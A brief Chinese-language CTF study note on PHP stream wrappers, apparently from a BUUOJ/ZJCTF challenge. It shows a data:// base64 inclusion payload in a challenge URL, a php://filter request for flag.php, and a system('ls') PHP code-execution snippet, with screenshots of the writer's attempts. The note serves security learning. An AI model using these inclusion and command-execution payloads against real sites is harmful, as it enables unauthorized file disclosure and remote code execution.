# 常用协议 php、file、data
https://www.cnblogs.com/zzjdbk/p/13030717.html
https://www.cnblogs.com/wjrblogs/p/12285202.html
https://tyskill.github.io/posts/php_filter_%E8%BF%87%E6%BB%A4%E5%99%A8/
``` 
text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= // d2VsY29tZSB0byB0aGUgempjdGY= 
解码后为 -----> welcome to the zjctf url：http://a7425027-7eb1-43be-a0c9-47a34018d60b.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
```

 - 补充一下这个 `php://filter/resource=flag.php`
可以实行 php 代码？

``` php
<?php system('ls');
```

![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240808020222.png)

![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240808020204.png)

## 自己尝试

![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240808020352.png)

![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240808020531.png)
